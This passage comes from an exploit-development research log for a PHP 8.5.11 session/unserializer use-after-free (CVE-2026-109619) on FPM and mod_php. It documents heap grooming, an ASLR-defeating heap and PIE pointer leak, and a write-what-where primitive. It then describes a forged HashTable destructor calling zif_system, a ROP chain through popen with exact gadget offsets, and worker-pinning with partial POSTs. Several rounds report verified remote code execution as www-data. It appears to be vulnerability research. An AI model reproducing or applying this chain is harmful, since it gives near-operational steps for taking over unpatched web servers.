`0x28f000` ends at `0x2903a0`; the next stored string is `0x298000`). The
forged length in Round 21 therefore hit a copy/orphan string, not the zval the
script reads, which is why `strlen()`/`bin2hex()` still see 5000.

To turn the forged length into an OOB response read, a stored value string must
cover the dtor run: a string allocated at `0x291000` (data `0x291018`) covers
`0x292000` at data offset `0xFE8`, exactly the pattern offset. The allocator
currently skips that 2-page run (the 9th string lands at `0x298000`), so the
next step is heap shaping so the value string takes `0x291000`, or moving the
A's dtor run onto a stored string's data range with the pad groom.

Files: `fpm/probe-split4.gdb` (bin2hex handler + argument dump),
`www/echo.php`.

### 22.1 Allocation alternation

Doubling the value count (12 x 4096-byte values) leaves the stored-string map
unchanged: 0x73000, 0x77000, ..., 0x8f000, 0x98000, 0x9c000, 0x2a0000,
0x2a4000. The region 0x90000-0x97fff, which contains the dtor run at 0x92000,
is skipped by every stored value string. The per-value order is
`estrndup` raw buffer (2 pages) -> decode -> `ZVAL_STRINGL_FAST` stored string
(2 pages) -> raw freed. The raw buffer takes the lowest 2-page run and is
reused (LIFO) by the next value, so the stored strings keep skipping that run;
the raw buffer's data at offset 0xfe8 is what supplies the -256 at 0x92000
(the raw buffer sits at 0x91000).

Consequences: the forged length hits the raw buffer's freed contents or an
orphan copy, not a stored `$_GET` string. To get a stored string at the run,
the raw/string alternation has to be broken: value sizes in a different bin,
consuming the lower runs before the values, or moving the dtor run onto a
stored string (E in H+0x10..H+0x1000 for a stored header H).

### 22.2 4088-byte values separate the bins but not the alignment

With vlen=4088 the `estrndup` raw buffer is 1 page (4089 bytes) and the stored
`zend_string` is 2 pages (4113 bytes), so they no longer compete for the same
run. Result:

- stored `$_GET` strings move to 0x72000, 0x76000, ..., 0x8e000, 0x97000,
  0x9b000, 0x9f000, 0x2a3000; the region 0x90000-0x96fff is still skipped;
- an orphan zend_string (len 4088) sits at 0x90000 with its data covering
  0x91000; it is not one of the `$_GET` zvals;
- the dtor block at 0x92000 read all-ones (`u=-1`); with used_slots=-1 the
  decoded integer 12345 was written at the block itself (0x92000), i.e. the
  primitive can also write at the block base.

The stored values still avoid the run under the dtor block. The next control is
to consume the orphan/temporary run at 0x90000-0x96fff or to move the A dtor
run to a stored header (`H+0x10..H+0x1000`) by changing the A page's pre-hole
allocations.

## Round 23 — app-visible ASLR-defeating leak (heap + PIE)

### 23.1 Alignment

Adding a pre-hole allocation to the A page (`fpm_sess_split2.php?pre=24576`)
moves the dtor run to `0x7ffff6287000` (off 0x87000). With 12 values of 4088
bytes, the stored `$_GET` string at `0x7ffff6286000` lies directly below the
run: data `0x86018`, entries at data offset `0xFE8`. The -256 pattern sets
`used_slots`, and `tmp_var` writes the decoded session value at
`block + 0x10 - 0x1000 = 0x86010`, the stored string's length field.

```
INIT ldt=0x7ffff6287000
BIN2HEX st=0x7ffff6286000 len=12345   (other values len=4088)
```

### 23.2 Leak

The reflected page (`www/echo.php`, `bin2hex($_GET[...])`) returns
`v5:24690` hex chars = 12345 bytes; the raw bytes contain:

```
0x18  7ffff625c428   heap pointer
0xff8 7ffff625c100   heap pointer
0x3008 555555bc9777  PIE pointer
0x3028 555555bc9777  PIE pointer
```

One response now defeats ASLR for both the heap and the php-fpm PIE base. The
OOB range `0x86018..0x89057` spans the freed dtor block and neighbouring
engine structures, so the leaked PIE value is a libphp code pointer whose
offset gives the base.

This is the first end-to-end memory disclosure on FPM 8.5.11 through
CVE-2026-109619's stale unserializer state. Requirements: a fatal producer
(application session decode OOM), `session.upload_progress` enabled, a
reflected GET sink, and same-worker requests.

### 23.3 Next: stage 2

Use the leaked PIE base for `zif_system` (offset from the php-fpm binary) and
the heap pointers for a fake HashTable/frame. The decode writes sequential
slots (`used_slots` increments per session value), so multiple session
variables can lay down the fake table fields, or the calif reference-list copy
can place a genuine zval. Trigger the destructor call at the next session
teardown.

Files: `www/fpm_sess_split2.php` (pre pad), `www/echo.php`,
`fpm/fcgi_split.py`, `fpm/probe-split4.gdb`.

## Round 24 — stage 2 target survey

Under the leak groom (`pre=0x6000`), the dtor run is at `0x87000` and the
session array's HashTable is at `0x5c310` (`ps_globals+0x168` ->
zend_reference -> HashTable; `arData` is the persistent empty-array bucket
array at `0x555556cc2ca8`, `n=0` before the decode). A pre sweep
(0x8000, 0xa000, 0xc000, 0xe000) leaves the dtor run at 0x87000 and the
session HT at 0x5c310; only `d` moves (0x1bb000..0x1c1000). The 4 KB write
window (0x86010..0x87000) does not reach the session HT.

Stage 2 options:

1. Move the dtor run to the session HT: E must satisfy `HT+0x30 =
   E+0x10-16K`, i.e. E in `HT+0x40 .. HT+0x1040` (0x5c350..0x5d350). The
   current A groom cannot allocate the hole below the script frontier; a
   different producer/groom (or a HashTable that lands in the window) is
   needed.
2. Target a HashTable that is already inside the window. The `$_GET` array
   and its arData live near the query strings (0x72..0x8e); their HT struct
   offset must be measured. Overwriting a GET-array bucket val (frame) and
   pDestructor fires at symbol-table teardown after the script.
3. Use the leaked heap/PIE pointers with a second write stage to build the
   fake table elsewhere, then trigger destruction (e.g. a reference zval
   pointing at the fake array, as in the calif chain).

The leak (Round 23) and the write (Rounds 21-23) are complete; stage 2 is a
table-placement problem.

### 24.1 GET array location

Found the `$_GET` array through `core_globals` (the `http_globals` zval array;
GET is index 1, scanned by type/keys): under the leak groom

```
GETARR ht=0x7ffff625c000 (off 0x5c000) ar=0x7ffff6292300 (off 0x92300) n=12
SESS   ht=0x7ffff625c310 (off 0x5c310) ar=0x555556cc2ca8 (persistent) n=0
dtor run E=0x7ffff6287000 (off 0x87000)
```

Both the GET HT and its arData are outside the 4 KB write window. The arData
(0x92300) is above E, and the write targets are always `E+0x10-16K`, i.e. at
or below E. The GET array cannot be reached from this dtor run.

The session array's arData is allocated by the decode's own insert
(`php_set_session_var`) after the first `tmp_var` write, so its address is
the remaining candidate: if it lands in the window, later session variables
can write a reference/fake-array zval into the bucket and build the fake
HashTable there; the real session HT's `zval_ptr_dtor` then walks into the
fake table.

## Round 25 — raw-buffer reclaim of `d` (attempt)

Goal: put attacker bytes at `BG(unserialize).data` itself (`d`, a 3-page
`php_unserialize_data` allocation) with a raw query `estrndup` buffer, which,
unlike a zend_string, has attacker data at offset 0. That would make
`last_dtor`, `entries`, `allowed_classes` and `ref_props` attacker-chosen
absolute values and turn `tmp_var` into an absolute write.

Findings under the leak groom (d=0x7ffff63b9000, off 0x1b9000):

- one 12000-byte query value (raw and stored string both 3 pages): the raw
  buffer lands at 0x60000 (marker scan), d still holds the A's fields
  (`last=d+0x38`, `fdt=ldt=0x87000`);
- 2, 3, 4 such values (4-8 three-page allocations) still leave d untouched;
- 5 values (QUERY_STRING pair ~60096) make the request fail (no response)
  even after fixing the FastCGI param chunking to split only at name/value
  pair boundaries (`fcgi_get_params()` rejects pairs spanning records).

The d run is a 3-page free run but the allocator takes lower 3-page runs
first. Reclaiming it needs the same exact-fit grooming as the dtor block:
consume the lower 3-page runs or move the d run up with the A groom.

Also measured: the session array's arData after the first insert is at
0x69a40/0x6d7c0 (2-variable session), still outside the 0x86010..0x87000
write window.

### 25.1 8200-byte sweep

One to seven 3-page values (vlen=8200, encoded pair ~8216) do not reclaim `d`
(`last=d+0x38` in every run). At n=5/6 `d->last_dtor` changes to 0x68000 while
`last` still points at the A's `d+0x38`: an overlapping 3-page query allocation
or `$_GET` structure wrote only the +0x10 field, so the read is engine data, not
attacker bytes. At n=7 the A's ldt is back. The d run at 0x1b9000 is not reached
by the allocator; lower runs and partial overlaps dominate.

Reclaiming `d` cleanly needs a dedicated groom (same exact-fit discipline as
the dtor block), or an allocation class that the `_GET` parser cannot place
overlapping structures into. The absolute-write stage remains open.

## Round 26 — `d` reclaimed; arbitrary-write design

### 26.1 Reclaim

Adding multipart fill fields before the file part reclaims `d`. With 150 fields
of 8170 bytes (raw buffer 2 pages, stored string 3 pages) the lower 3-page runs
are consumed and a fill field's raw `smart_str` buffer lands at
`d=0x7ffff63b9000`:

```
INIT level=1 d=0x7ffff63b9000 doff=0x1b9000
  last=0x4141414141414141 fdt=0x4141414141414141 ldt=0x4141414141414141
```

The raw field buffer has attacker bytes at offset 0 (no zend_string header), so
`php_unserialize_data` is fully attacker-controlled when the session decode
runs. The field value that lands at `d` carries the fake structure.

### 26.2 Arbitrary write

Layout in the 8170-byte fill value (at `d`):

```
d+0x00 last = 0
d+0x08 first_dtor = d+E1
d+0x10 last_dtor  = d+E1
d+0x18 allowed_classes = 0
d+0x20 ref_props = 0
d+0x28 cur_depth = 0
d+0x30 max_depth = large
d+E1: fake var_dtor_entries { used_slots = -128, ... }
d+E2: fake var_dtor_entries { used_slots = K2, ... }
```

A session variable whose `tmp_var` target is `d+0x10` writes an integer
`d+E2` there, i.e. it rewrites `last_dtor`. The next variable then uses E2 and
its `used_slots` to write an arbitrary 8-byte value at
`E2 + 0x10 + 16*used_slots` (pointer arithmetic wraps; any target address is
reachable). Repeating (write `d+0x10 = E_next`, then the payload) gives a
write-what-where machine driven entirely by the session data (integers).

Frame construction: six consecutive slots at a chosen bucket val, with the
arg0 slot written by a string session value so its type is IS_STRING(6) and
its value is the decoded command string pointer. `num_args` is the high dword
of an integer slot. `pDestructor` is an integer slot equal to `zif_system`
(PIE base from the Round 23 leak).

Remaining: implement the scripted session sequence and verify the
`pDestructor`/frame writes, then trigger session-array teardown.

Files: `fpm/fcgi_split.py` (fill/big field args, STDIN chunking).

### 26.3 Insert-order hazard

The session decoder calls `tmp_var()` (our write) and then
`php_set_session_var()` (a `zend_hash_update` into the session HT) for each
variable. Writing `arData`/`nNumUsed` early makes the *next* insert operate on
the fake table, overwriting the frame or crashing. The working order must be:

1. jump var: target `d+0x10`, write `last_dtor = E_next`;
2. payload vars: targets in the real HT (pDestructor, nTableSize);
3. a final var whose `tmp_var` target is `arData` and whose unserialize
   *fails*, so `php_set_session_var()` is skipped; `php_session_decode()`
   returns FAILURE and the failure path destroys the session, calling
   `zend_array_destroy()` on the corrupted HT.

Reaching `arData` after the higher fields needs a second jump, and the jump
target is `d+0x10` (below the HT fields), so the sequence must be reordered:
initial entries target `d+0x10` for the jump, then E_next targets `arData`, then
the failing value. pDestructor/nTableSize are written in a separate earlier
jump or accepted as the type words of the arData/nTableSize writes
(`nNumUsed = 4` is safe if buckets 1..3 have `IS_UNDEF` types).

Remaining: encode this sequence in the session file and verify with the d
classic fake-frame layout from Round 16 (`num_args` at +0x2C, arg0 string at
+0x50, type 6).

### 26.4 Jump cycle and frame fields

The jump needs a variable whose target is `d+0x10`; after a payload write the
sequence only advances 16 bytes. Solution: a two-variable ring. An entries
block targeting `d+0x00` makes the next variable target `d+0x10`; that
variable writes a new `last_dtor` (next entries block). The `d+0x00` write
corrupts `last`/`first_dtor`, which the decode ignores because the session
data has no `R:`/`r:` references. Repeating the ring gives unlimited jumps.

Frame field writes are individual targeted zvals, not one contiguous run:
`num_args` at `bucket_val+0x2C` must be written by a zval whose *value* low
dword is 1; the contiguous slot write puts `IS_LONG` in the type word at
`+0x28` and 0 in `u2` at `+0x2C`, so a dedicated write is required. The ring
allows it. The frame lives in the session array's first three buckets
(0..2); inserts for the frame-writing variables go to indices >=3 if three
harmless session variables are inserted first, so they do not overwrite it.

## Round 27 — crafted fake `d` does not survive to the decode

The fill-field reclaim with a crafted 8170-byte value (fake
`php_unserialize_data` at offset 0, entries at 0x800/0x900, all d-based
absolute addresses) does not reach the decode: at `php_var_unserialize_init`

```
INIT d=0x7ffff63b9000 last=0x0 fdt=0x0 ldt=0x0
```

The first qword matches the crafted value (0), but 0x08/0x10 are zero instead
of `d+0x800`. The plain-'A' fill (Round 26) does survive, so the allocation
that lands at `d` is not the crafted field's raw buffer at decode time: a
later file-part/engine allocation reuses the freed fill run and zeroes the
fields, or the crafted binary value changes the multipart allocation sequence.

The fake structure must be in memory that is still live (or re-established
after every reuse) at the session decode. Next controls: place the fake
structure in a stored/live allocation instead of the freed parser buffer
(e.g. the `$_POST` value string data if its allocation can be aimed at `d`),
or add fill fields after the file part's allocations but before the decode
(the FILE_START event ordering limits this), or re-spray the fake bytes
immediately before the decode.

### 27.1 Content dependence

The survivor difference is the fill *content*, not the session file or script:
with the same `sess_B2` and `echo.php`, the plain-'A' fill reaches `d` while the
crafted fill (zeros + d-based pointers, even with a nonzero first byte) leaves
`last=fdt=ldt=0` at the decode. `multipart_buffer_read_body()` is binary-safe
(`erealloc` + `memcpy` + length), so the parser does not truncate on NUL; the
zeroed fields are therefore a *different* allocation at `d`, not our fill
buffer, in the crafted runs.

The next diagnostic is to scan the chunk at the decode for the crafted
signature (`d+0x800` at offset 8) and for the plain 'A' run, to see which
allocation owns `d` in each case and what differs in the multipart allocation
sequence (stored strings vs raw transient buffers).

### 27.2 Pointer bytes at `d` are replaced by the fill's filler bytes

`fillM` (8170 bytes of `'A'` with `d+0x800` at offsets 0x08/0x10 and the
`used_slots=-129` at 0x800/0x900) still shows
`last=fdt=ldt=0x4141414141414141` at the decode, and the VERIFY dump reads
`'A'` bytes through 0x110. The POST path itself preserves the exact bytes:
`post.php` echoes `$_POST['f0']` as
`010000000000000000983bf6ff7f0000...` for `fillK`, so the parser, filter and
zend_string copy are binary-safe.

The allocation that owns `d` at decode time is therefore not any fill value
copy: it is an `'A'`-filled region with the pointer edits missing, most likely
a partially reused parser buffer whose earlier contents were the filler bytes.
The fake `d` must come from a **live** buffer whose base is `d` at the decode,
not a freed per-field buffer.

Candidate: the 5121-byte `multipart_buffer` read buffer is live at the decode,
page-aligned, and its base is raw body bytes. Its content at FILE_START is the
body chunk around the progress/file headers; the body can be shaped so the
buffer base at that moment holds the fake `php_unserialize_data` (the buffer
is 2 pages, which covers the d fields and the entries at +0x800; the entries
at +0x900 are beyond and would live in another controlled buffer).

## Round 28 — stage-2 reaches the fake table; crash before teardown

With the stored-string-data offset (`0xfe8`) fixed, the fake
`php_unserialize_data` survives the decode and the jump ring works. Payload
`fpm/payload/fillZ.bin` + `fpm/payload/sess_P`:

```
a|i:<d+0x38>;b|i:<E1>;c|i:<fake_arData>;d|i:256;e|i:<zif_system>;f|X
```

- var a: target `d+0x00` (E0 at d+0x800, used -129), writes a valid `last` and
  performs the first session insert (initializing the real HT).
- var b: target `d+0x10` (E0 used -128), writes `last_dtor = E1`.
- var c: E1 (d+0x908, used -89443) targets `HT+0x10`, writes the fake
  `arData = d+0xE00`; the insert now runs on the fake table.
- var d: target `HT+0x20`, `nTableSize = 256` (avoid the `zend_hash_rehash`
  crash seen with 0).
- var e: target `HT+0x30`, `pDestructor = zif_system` (0x555555a0e3a0 under
  setarch -R, base 0x555555400000 + 0x60e3a0).

Observed: TMPSESS shows the fake arData `0x7ffff63b9e00` from n=5 through n=7,
so the arData/nTableSize/pDestructor writes landed. The next crash is in
`zend_hash_find()` from session code after the decode, before the session
destroy (likely `php_get_session_var` in the flush encode or the upload-progress
lookup walking the fake table's frame buckets/keys).

Remaining: make the teardown run immediately after the `pDestructor` write
(e.g. fail the decode in the next variable so `php_session_destroy` fires
before the encode/lookup), or make the fake buckets safe for the encode/find
(bucket keys at frame offsets 0x18/0x38/0x58 must not be bogus pointers).

## Round 29 — FPM 8.5.11 in-band chain: RCE verified (uid=33)

The session decode itself (the probe no longer writes the HashTable; it only
points the live `php_unserialize_data` at `d`) installs the fake table and gets
`pDestructor = zif_system` called with a forged `execute_data`.

Working set: `fpm/payload/fillU.bin` (8170-byte multipart value) and
`fpm/payload/sess_T`:
`a|i:<d+0x38>;b|i:<E1>;c|i:<arData>;d|i:256;e|i:<zif_system>;`

Layout (setarch -R, PIE base 0x555555400000): `d=0x7ffff63b9000`,
`HT=0x7ffff625c2d8`, `arData=d+0xE00`, `E0=d+0x800` (used -129, target
`d+0x00`), `E1=d+0x908` (used -89443, target `HT+0x10`), frame at `d+0xE00`,
cmd string at `d+0xF00`.

Defects found and fixed this round:

- The HT `nTableMask` is **-16**, not -8: the empty-slot array is 64 bytes at
  `arData-64` (`d+0xDC0..0xDFF`). Thirty-two bytes left `0x41` garbage that the
  upload-progress key lookup dereferenced as a bucket index.
- `php_session_normalize_vars()`/`PS_ENCODE_LOOP` calls
  `php_get_session_var(bucket->key)` for every string key. Frame offsets `0x18`
  and `0x38` are 0 (numeric keys, skipped), but `0x58` is the arg0 type qword.
  It is set to `d+0xF06`: a readable fake zend_string with `h=0` whose low byte
  is still `0x06` (`IS_STRING`).
- `Z_PARAM_PATH_STR` checks `ZSTR_LEN != strlen(ZSTR_VAL)`; the fake command
  string needs a NUL at `val[len]` (`d+0xF2C`).
- gdb's `follow-fork-mode child` hijacks popen's fork. The probe switches to
  `parent` at the popen breakpoint so the shell runs.

**Priming is in-band, no debugger writes.** The A request
(`fpm_sess_split2.php` with the 1.1 MB session file, `memory_limit=4M`) hits an
OOM bailout inside `session_start()`'s decode. The bailout skips
`php_var_unserialize_destroy()`, leaving `BG(unserialize).level = 1` and
`BG(unserialize).data` pointing at the freed `php_unserialize_data` (the
state-corruption-via-bailout class fixed in `31c0ea7d7ff`, 8.5.12). The B
request's 8170-byte multipart fill reclaims that chunk; the next decode's
`php_var_unserialize_init()` takes the reuse branch (`level != 0`) and uses the
forged `d` at fill offset `0xFE8`. The runner gives the container the
`p2s-fpm-8511` network alias because the nginx upstream is hardcoded to that
name, so the A request reaches the same single worker.

Verified: `fpm/run_rce_fpm.sh` on a fresh container prints
`uid=33(www-data) gid=33(www-data) groups=33(www-data)` from
`/tmp/fpmx_proof`, both without a debugger (`setarch -R php-fpm -F`, default)
and under the tracing probe (`MODE=gdb`).

Caveats: `setarch -R` disables ASLR, so the fixed addresses (`d`, `HT`,
`zif_system` offset) are lab-only; a real target needs an address leak. The
worker SIGSEGVs after the proof (fake `return_value` write and the `efree` of
the forged `arData`), and FPM respawns it.


## Round 30 — groom genericity: only the 24 KB allocation matters

Clean per-variant runs (one `p2s-fpm-8511` alias holder at a time, nginx
restarted so it re-resolves the upstream) with the same `sess_A`/`sess_T`:

| A request | result |
|---|---|
| `pre=24576&pad=1490900&hole=4096` | proof |
| no params (`pre=0`, `pad=0`, `hole=4096`) | worker crash, no system |
| `pre=24576&pad=1490900&hole=0` | proof |
| `pre=24576&pad=0&hole=0` | proof |
| `pre=0&pad=1490900&hole=0` | no proof |
| `pre=12288&pad=0&hole=0` | 200, no crash |
| `pre=32768&pad=0&hole=0` | crash, no system |

So the 24 KB `str_repeat('P', $pre)` is the load-bearing part of the groom; the
4 KB hole and the 1.49 MB pad are unnecessary, and the size is alignment-tuned
(12 KB does not prime, 32 KB primes but lands the wrong addresses).

Bailout genericity, from the source: a thrown exception in `__wakeup` does
**not** skip the destroy. `var_destroy()` continues after the call
(`ext/standard/var_unserializer.c:262`), then `php_var_unserialize_destroy()`
frees `d` and decrements `BG(unserialize).level` (`:84`). Only a
longjmp-class bailout (OOM, `exit()`, a fatal error, a timeout) leaves
`level = 1` with a dangling `data` pointer. The lab's `ini_set('memory_limit',
'4M')` is one instance; with the default 128M the same A page does not bail.

Harness trap: nginx resolves `fastcgi_pass p2s-fpm-8511:9000` at startup and
caches the IP forever. Leftover containers carrying the same network alias made
early variation runs hit the wrong worker; restart nginx after creating the
container and keep exactly one alias holder.

A generic application supplies the same state only if it has all three:
(1) a decode-time longjmp bailout, (2) attacker-controlled session file
content, (3) a controllable ~24 KB allocation before `session_start()` (or an
equivalent heap groom). ASLR is off in the lab; a real target also needs an
address leak.


## Round 31 — 10 prefork children, stock KeepAlive: keep-alive vs pinning

Target: `php:8.5.11-apache` prefork with `ServerLimit/StartServers/
MaxRequestWorkers = 10`, stock `KeepAlive On`, `MaxKeepAliveRequests 100`,
`KeepAliveTimeout 5`, stock php.ini-production (`lab/php-off.ini`). Fresh
container per run. Config: `lab/httpd-10ka.conf`.

Keep-alive affinity (research relay `off_chain/keepalive_relay.py`: one client
socket per stage, one persistent backend connection, `Connection: close`
rewritten to the equal-length `xlose`, static `/keep.txt` pings every 2.5s):

- `/pid.php` canary: one connection returns the same PID twice; 10 separate
  connections hit all 10 children; six separate client sockets through the
  relay all return one PID (16). Keep-alive affinity itself works.
- Full chain through the relay: A1 returns 500, then the relay must reconnect;
  B1 lands on another child, the leak parse fails (`/tmp/off_leak.resp` is 251
  bytes, no forged `Set-Cookie`).
- Direct check: the A1 bailout response is `HTTP/1.0 500 ... Connection: close`
  even when the request sends `Connection: keep-alive`; a second request on that
  socket gets EOF. So keep-alive cannot carry the chain across the OOM stages.
- The close is SAPI bailout handling, not just an unread body: `POST
  /fatal.php` (`E_USER_ERROR` after reading the body) and `POST /oom.php`
  (script OOM after reading the body) both answer `HTTP/1.0 500 ... Connection:
  close` and the next request gets EOF. A normal 200 keeps HTTP/1.1 keep-alive.
  A `GET` pipelined behind the fatal request is discarded (only the 222-byte
  500 comes back).

Pinning (validated): 9 partial chunked POSTs hold 9 children; the 10th serves
A1/B1/A2/B2:

```
pinned 9 children on port 8093
A1 500; B1 main=0x7b8728800000 libphp=0x7b872a400000
A2; B2
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Mon Oct 26 18:29:16 UTC 2026
```

Reproduce: `CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093
/tmp/off_proof`. New tools: `off_chain/pin_workers.py`,
`off_chain/run_off_chain_pinned.sh`, the research relay, `lab/httpd-10ka.conf`,
`www/keep.txt`.


## Round 32 — external PoC evaluation: pipeline claim false, gadgets valid

Evaluated `exploit_10005_pipe_py.py` (PHP 8.5.11 single-file, one-connection
A1+B1+A2+B2 pipeline, then a hash-table-OOM fake object + ROP `popen`).

Test on `p2s-10ka` (10 children, stock KeepAlive, stock php.ini-production,
128M):

- The 48.3 MiB pipeline was accepted on one connection, but all four responses
  were `HTTP/1.1 200` (243/306/242/306 bytes) and the `Set-Cookie` values were
  ordinary 32-byte session cookies. The leak parse found no bases; no proof.
  The 24 MiB "OOM" arms do not reach 128M, so the state is never created and
  the pipeline works only because nothing bails out. Any real OOM closes the
  connection (Round 31), so this pipeline cannot carry the actual stages.
- The gadget offsets are valid for this libphp: `popen@plt` `0x18BBC0`,
  `pop rdi;ret` `0x197128`, `pop rsi;ret` `0x195A89`, `ret` `0x183016`,
  `mov rdi,rsp` `0x64904E`; `zval_ptr_dtor` `0x7B47A0` matches the Off chain.
- Useful directions: (1) replace the `zif_system` execute_data frame with a
  destructor-to-stack-pivot-to-`popen` ROP chain (the pivot's follow-on
  instructions and fake-stack layout must be validated); (2) the separate small
  libphp leak via a short cookie instead of the 819 KB heap dump; (3) the
  hash-table-OOM/parser path for the final fake object, a distinct primitive
  from the session `pDestructor` chain and not implemented in ours.
- Not adopted: the one-connection pipeline as an affinity mechanism. Pinning
  remains the working multi-worker route.


## Round 33 — B2 ROP variant: pivot + popen, no execute_data frame

Prototype `off_chain/stage3_rop.php` (selectable with
`STAGE3=stage3_rop.php`): the same A1/B1/A2 state, but the fake HashTable's
`pDestructor` is the libphp `mov %rdi,%rsp` gadget at `0x64904E`. The gadget
restores MXCSR/x87 and callee-saved registers from the bucket, sets
`rsp = bucket+0x48`, and jumps to `bucket+0x40`. Bucket 0's value is the ROP
stack: `pop rdi;ret` `0x197128` -> command, `pop rsi;ret` `0x195A89` -> `"r"`,
`ret` `0x183016`, `popen@plt` `0x18BBC0`.

The bucket+0x10 qword overlaps `HT->pDestructor`; it must be the pivot (the
gadget loads it into r12); that was the one layout bug found.

Validated on 10 children with 9 pins:

```
main=0x7a63ada00000 libphp=0x7a63aa400000
B2-ROP S=0x7a63adaf7398 pivot=0x7a63aaa4904e popen=0x7a63aa58bbc0
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Benefits: no forged `execute_data`, no `func`/`num_args`/arg0-type/NUL-string
constraints, no `return_value` write; only the ROP stack and the leaked bases.
The PoC's one-connection pipeline and 24MB OOM arms remain unusable (Round 32).


## Round 34 — ROP pivot: mod_php validated; FPM blocked by the progress insert

- **mod_php:** `stage3_rop.php` validated on 10 children with 9 pins
  (`main=0x7a63ada00000`, `libphp=0x7a63aa400000`, pivot
  `0x7a63aaa4904e`, popen `0x7a63aa58bbc0`, `RCE OK`, `uid=33`). The
  `jump_fcontext` pivot is at `libphp+0x64904E`; bucket+0x10 overlaps
  `HT->pDestructor` and must hold the pivot; the ROP stack starts at
  bucket+0x48 (`pop rdi`, command, `pop rsi`, `"r"`, `ret`, `popen@plt`).
- **FPM:** the php-fpm binary has the same pivot at `0x6bdd0e`, `popen@plt`
  at `0x202e50`, `pop rdi` `0x20a7e8`, `pop rsi` `0x209149`, `ret` `0x20a7e9`
  (base `0x555555400000`). The in-band teardown's upload-progress
  `zend_hash_update` writes **bucket 0** after the normalize zeros `nNumUsed`;
  the pivot's MXCSR q0 becomes the progress array pointer `z`
  (`0x7ffff625c1f8`) and `ldmxcsr` #GPs at `jump_fcontext+8`. The zif frame
  tolerated the same write because its opline is unused. No
  `mov/lea rsp,[rdi+imm]; ret` or usable register pivot exists in the binary.
  Path: the mod_php-style fake-reference/fake-HashTable B2 at the B's
  `track_init`, before the progress insert; it needs FPM spray calibration at
  `z`. The in-band `zif_system` FPM chain remains the working one.
- **Harness bugs fixed:** `fpm/run_rce_fpm.sh` used `NAME=${NAME:-...}`, but
  `NAME` is the host name, so `docker rm -f "$NAME"` removed the pre-existing
  `LAPTOP-6JJ0HIPA` (php:8.4.26-apache) container and reused the name. Changed
  to `FPM_NAME`. The host-versus-container fill path in the `fcgi_split.py`
  call is fixed (it sent the old `/tmp/fillU.bin` while the session used the
  pivot), plus an nginx restart after container creation and `FILL`/`SESS`/
  `PROBE` selectors.


## Round 35 — FPM script-write variant and the RINIT reset

The session-write idea for the FPM pivot (a script writes
`$_SESSION['x'] = 0x0000037F00001F80`, supplying valid MXCSR/fldcw words at
bucket 0 after the normalize zeroes `nNumUsed`) does not reach the fake table:
`PHP_RINIT_FUNCTION(basic)` runs `memset(&BG(unserialize), 0, ...)`
(`ext/standard/basic_functions.c:393`) before the script, so the B's
`session_start` allocates a fresh `d` and decodes into a real session array
(trace: `HT=0x7ffff625b230`, `pd=default`, `nu` 0..6; no fake-table writes).

The in-band table variant therefore stays blocked for single-process FPM too:
the upload-progress insert writes bucket 0, and a script write cannot repair it.
The open path is the pre-RINIT upload-progress callback: its
`php_session_initialize()` runs during POST parsing before
`zend_activate_modules()`, so `track_init` can destroy a fake
reference/fake HashTable (mod_php B2 shape) before the progress insert. That
needs FPM reference/fake-HT spray calibration; the single worker gives a
deterministic heap for it.

Added for the experiment: `www/fpm_rop.php`, `NO_PROGRESS=1` support in
`fpm/fcgi_split.py`, and `B_PAGE` in `fpm/run_rce_fpm.sh`.

## Round 36 — PS-zval type check: the pre-RINIT fake reference is dead on FPM

Probe `probe-ref2.gdb` printed the zval type of `PS(http_session_vars)` at
every `php_session_start`'s `track_init`:
- A's own start: `z=0 type=-1` (no prior), B/pre-RINIT callback: `z=0x...260 ht=0x...1c0 type=0` (IS_UNDEF),
  later B start: `type=10` (B's own new reference).

So the `if (!Z_ISUNDEF(PS(http_session_vars)))` in the probe's track_init is
false at the FPM pre-RINIT callback; the stale A reference is never destroyed.

Why no A state survives:
- `php_session_rshutdown` calls `php_rshutdown_session_globals()`
  unconditionally (session.c:2916); that function destroys and `ZVAL_UNDEF`s
  the PS zval when set (session.c:161-164). `session_write_close()` cannot
  skip it.
- The other shape, an A that bails out before the module RINIT (A2 pre-RINIT
  OOM, PS zval still a reference), makes `php_request_startup()` return
  FAILURE in FPM, and fpm_main.c:1838-1842 then calls
  `fcgi_finish_request` + `php_module_shutdown()` + `return FPM_EXIT_SOFTWARE`,
  i.e. the worker exits. No next request exists in that worker.

Single-process/single-worker does not change either fact: both are
request-startup/shutdown policy, not process-model dependent. The mod_php
B2 works only because mod_php's failed-startup handler skips the module
RSHUTDOWN and keeps the PS zval type `10`.

Consequence: the fake-reference/fake-HashTable path through the PS zval is a
dead end on FPM. The direct `zif_system` fake-table chain (progress insert)
remains the FPM RCE; the ROP pivot does not.

### Round 36.1 — the Round 23 leak reproduces with ASLR ON

The Round 23 app-visible leak was re-run on `p2s-fpm-gdb:8511` without
`setarch -R`; the container reports `randomize_va_space=2`. Same A/B as
Round 23: A `fpm_sess_split2.php?pre=24576&pad=1490900&hole=4096` (HTTP 500,
the 4M OOM), B session file `p|i:12345;`, B request
`fcgi_split.py 9003 <sid> feffffffffffffff 0 0 0 4088 12 /var/www/html/echo.php`.

The `v5` body is 12345 bytes; the response carried
`0x...7c9777` (PIE) and `0x76ec7de5c428` (heap) this run. Against the worker
maps:
- PIE: `0x55ea36bc9777 - 0x55ea36400000 = 0x7c9777`, the known code offset
  from the ELF base, so the leak gives the php-fpm base.
- Heap: the leaked pointer lies in
  `76ec7de00000-76ec7e000000 rw-p [anon:zend_alloc]`; the ASLR-independent
  delta from the leaked value to `d` is the Round 23/30 value
  (`d = leaked + 0x15cbd8` under the leak groom).

So the heap/PIE leak is not the remaining gap; it is verified end-to-end with
ASLR on. The open item is the layout calibration on the **release** image
(`php:8.5.11-fpm`): the same A/B does not forge the length there, consistent
with `ZEND_DEBUG`'s per-allocation chunk overhead shifting the dtor block
relative to the B's stored string. A `pre` sweep on the 8-byte chunk grid is
running; if it misses, the next knob is the B string's bin (`vlen`/string
index), since the A block is at bin 0x1008 and the 4088-byte string at 0x1010.

### Round 36.2 — release-image leak verified; the ini is the layout key

The 641-value `pre` sweep (24576..29696 step 8) on `php:8.5.11-fpm` with no
active `php.ini` produced no forged length. The gdb image and the release
image carry the **same** `/usr/local/sbin/php-fpm`
(md5 `de9f7bd2799504ff67240075fd4e6a03`); the gdb image only activates
`php.ini-production`. Without `php.ini` the built-in defaults differ
(`output_buffering=0` vs 4096, `zend.assertions=1` vs -1, and the rest), which
